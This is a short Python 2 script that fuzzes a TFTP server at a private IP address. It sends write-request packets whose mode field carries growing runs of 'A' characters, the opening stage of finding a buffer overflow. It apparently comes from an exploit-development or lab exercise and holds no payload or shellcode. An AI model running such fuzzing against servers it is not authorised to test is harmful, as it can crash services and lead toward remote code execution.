#!/usr/bin/python
import socket

# First set of A's
buffer_array = ["\x41" * 100]
addition = 200

# Appending fuzzing strings in increments of 100
while len(buffer_array) <= 50:
	buffer_array.append("\x41" * addition)
	addition += 100

# Sending each element of the array in the Mode field
for value in buffer_array:
	# Using mode 02 (write request). The A's go in the mode field.
	tftp_packet = "\x00\x02" + "Coconut" + "\x00" + value + "\x00"
	print "Fuzzing with length " + str(len(value))
	
	# Setting up UDP socket
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.sendto(tftp_packet,('192.168.1.22',69))

	response = s.recvfrom(2048)
	print response

